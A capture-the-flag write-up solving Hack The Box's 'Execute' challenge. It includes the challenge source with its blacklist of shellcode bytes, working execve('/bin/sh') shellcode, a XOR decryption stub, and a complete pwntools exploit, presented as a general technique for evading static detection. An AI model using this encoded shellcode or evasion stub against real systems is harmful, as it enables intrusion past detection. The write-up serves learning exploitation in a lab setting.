---
title: Shellcode Encryption to Bypass Static Detection
author: vym
date: 2025-06-03
barcode: 47491014
---

# Intro

Encrypting shellcode is probably the oldest and simplist way to bypass detection in exploit or malware development. This blog post will go over solving an easy exploitation challenge called [*"Execute"* from Hack The Box](https://app.hackthebox.com/challenges/Execute) where it implements a simple detection mechanism in the form of a byte blacklist that blocks certain common bytes that often show up in shellcode.

# The Challenge

The authors were kind enough to provide us with the source code for this challenge binary:

```c
// gcc execute.c -z execstack -o execute

#include <signal.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

void setup() {
    setvbuf(stdin,  NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    alarm(0x7f);
}

int check(char *a, char *b, int size, int op) {
    for(int i = 0; i < op; i++) {
        for(int j = 0; j < size-1; j++) {
            if(a[i] == b[j])
                return 0;
        }
    }
    
    return 1337;
}

int main(){
    char buf[62];
    char blacklist[] = "\x3b\x54\x62\x69\x6e\x73\x68\xf6\xd2\xc0\x5f\xc9\x66\x6c\x61\x67";

    setup();

    puts("Hey, just because I am hungry doesn't mean I'll execute everything");
    
    int size = read(0, buf, 60);
	   
    if(!check(blacklist, buf, size, strlen(blacklist))) {
        puts("Hehe, told you... won't accept everything");
        exit(1337);
    }

    // Literally casts the buffer into a function pointer and executes it
    ( ( void (*) () ) buf) ();
}
```


We are given a C program that will read our input into a buffer, check it against the blacklist of banned bytes, and if it passes the check, execute it as shellcode. The challenge is to provide input that does not contain any of the blacklisted bytes while still being valid shellcode.

```c
char blacklist[] = "\x3b\x54\x62\x69\x6e\x73\x68\xf6\xd2\xc0\x5f\xc9\x66\x6c\x61\x67";
```

These bytes correspond to common shellcode patterns and system call opcodes. If any of these bytes are detected in our input, the program refuses to execute it.

## Analysis of the Blacklist

- `\x3b`: execve syscall number
- `\x62`, `\x69`, `\x6e`, `\x73`, `\x68`: ASCII characters for "/bin/sh"
- `\x66`, `\x6c`, `\x61`, `\x67`: ASCII characters for "flag"

This blacklist is designed to prevent direct execution of common shellcode that spawns `/bin/sh` or cat `flag.txt`.


# The Solution

Ok so obviously we need to supply shellcode such that upon inital comparison with the blacklist, it does not contain any of the blacklisted bytes, but when executed it will trasnform itself into valid shellcode that can spawn a shell.

We can do that by XOR encrypting the shellcode and adding a small stub that gets executed right before the shellcode to dynamically decrypt it during runtime.


## Shellcode

For the shellcode I grabbed a Linux x64 `execve("/bin/sh")` shellcode from [Shell-Storm](https://shell-storm.org/shellcode/index.html)

!!! note
    Made sure to get a small one because our buffer is limited to around 60 bytes.

```python
shellcode = b"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"
```

To check for banned bytes I wrote a small Python function:

```python
def print_blacklisted(shellcode, blacklist):
    for i in range(len(shellcode)):
        if shellcode[i] in blacklist:
            print(f"\033[31;1;4m{hex(shellcode[i])}\033[0m", end=" ")
        else:
            print(f"{hex(shellcode[i])}", end=" ")

    print()
```

![Original shellcode banned bytes](/public/img/shellcode-encryption/ogshellcodecheck.png)

And obviously, this shellcode contains several of the blacklisted bytes, so we need to encrypt it before we can use it.

## XOR Encryption

```python
xored_shellcode = bytes([x ^ 0xac for x in shellcode])
```

Encrypted each byte of the shellcode with the key `0xac`.

!!! note
    Why specically `0xac`? No reason, It just didn't produce any blacklisted bytes.

![Encrypted shellcode banned bytes](/public/img/shellcode-encryption/encshellcodecheck.png)

Tada! No blacklisted bytes in the encrypted shellcode, but it is still gibberish and cannot be executed without the decryption stub.

## The Decryption Stub

We need a small piece of code that runs first to decrypt our payload. This stub will locate the encrypted shellcode in memory and decrypt it, so that it will be valid shellcode when executed.

```asm
call get_rip                  ; call will push rip onto the stack
get_rip:
    pop rsi                   ; popping rip into rsi
    add rsi, 0x14             ; move by length of the stub to point to encrypted shellcode
    mov rcx, 24               ; length of the encrypted shellcode
decrypt:
    xor byte ptr [rsi], 0xac  ; Decrypt each byte
    inc rsi                   ; Move to next byte
    loop decrypt              ; Repeat until rcx = 0
```

Here we use a `call/pop` PIC technique to get the current instruction pointer and adjust it to point to our encrypted shellcode. The `xor` operation decrypts each byte, and we use a loop to process the entire shellcode.

## Final payload

Our final payload structure is:
1. Decryption stub (25 bytes)
2. Encrypted shellcode (24 bytes)

Total payload size: 49 bytes (well within the 60-byte limit)

![](/public/img/shellcode-encryption/finalpayloadcheck.png)

Our stub also seems to be clean from any blacklisted bytes, so we're gaming.

# Executing in GDB

To demonstrate the exploit I ran the final payload and set a breakpoint in GDB to observe the decryption process:

![](/public/img/shellcode-encryption/gdbbeforedec.png)

In this current state, we have reached the decryption stub, and the encrypted shellcode is still gibberish.

After stepping though the decryption stub, we can see the shellcode decrypted in memory:

![](/public/img/shellcode-encryption/gdbafterdec.png)

Now we see the original shellcode which just puts `0x3b` (the syscall number for `execve`) in `rax`, sets up the arguments for `execve` (the string `"/bin/sh"`) in the appropriate registers, and finally calls the syscall to spawn a shell.

# Conclusion

This challenge was a cool introduction to payload encryption techniques and PIC shellcode to evade simple detection mechanisms.

# Full exploit

```python
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or 'execute', checksec=False)
context.terminal = ["kitty"]

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b * main+174
'''.format(**locals())

blacklist = b"\x3b\x54\x62\x69\x6e\x73\x68\xf6\xd2\xc0\x5f\xc9\x66\x6c\x61\x67"

def print_blacklisted(shellcode, blacklist):
    for i in range(len(shellcode)):
        if shellcode[i] in blacklist:
            print(f"\033[31;1;4m{hex(shellcode[i])}\033[0m", end=" ")
        else:
            print(f"{hex(shellcode[i])}", end=" ")

    print()

shellcode = b"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"

xored_shellcode = bytes([x ^ 0xac for x in shellcode])

shellcode_stub = asm('''
call get_rip
get_rip:
    pop rsi
    add rsi, 0x14
    mov rcx, 24
decrypt:
    xor byte ptr [rsi], 0xac
    inc rsi
    loop decrypt
''')

info(f"{len(shellcode_stub)=}")
info(f"{len(shellcode)=}")
payload = shellcode_stub + xored_shellcode

# print_blacklisted(payload, blacklist)

io = start()

io.sendline(payload)

io.interactive()
```
